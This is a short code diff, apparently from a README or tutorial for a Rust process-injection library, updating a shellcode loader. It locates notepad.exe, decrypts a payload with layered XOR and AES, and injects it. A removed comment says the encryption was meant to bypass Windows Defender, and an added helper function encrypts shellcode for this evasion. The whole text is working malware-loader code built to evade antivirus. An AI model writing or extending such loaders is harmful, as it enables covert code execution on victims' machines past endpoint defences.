@@ -18,18 +18,28 @@ use needle::{
     find_process, inject, Shellcode,
 };
 
-const SHELL_CODE: &[u8] = include_bytes!("YOUR_PAYLOAD.bin");
-const KEY: u8 = 0x42;
+const SHELL_CODE: &[u8] = include_bytes!("YOUR_ENCRYPTED_PAYLOAD.bin");
+const XOR_KEY: u8 = 0x42;
+const AES_KEY: [u8; 32] = [ /* ... */ ];
 
 fn main() {
-    // The payload is encrypted one time using XorCypher
-    // -> Allows for bypassing windows defender on my machine
-    let payload = XorCypher::<Shellcode>::from_encrypted(SHELL_CODE, KEY);
-    
+    let payload = XorCypher::<AesCypher>::from(SHELL_CODE.to_vec())
+        .decrypt(&XOR_KEY)
+        .decrypt(&AES_KEY);
+
     let process = find_process("notepad.exe").expect("Target process not found");
     if let Err(e) = inject(process, payload) {
         println!("Could not inject payload: {}", e);
     }
+}
+
+#[allow(dead_code)]
+fn generate_payload(shellcode: Shellcode) {
+    let payload = shellcode
+        .into_raw()
+        .aes_encrypt(&AES_KEY)
+        .xor_encrypt(XOR_KEY);
+    println!("Encrypted shellcode: {:#04x?}", payload);
 }
 
 ```
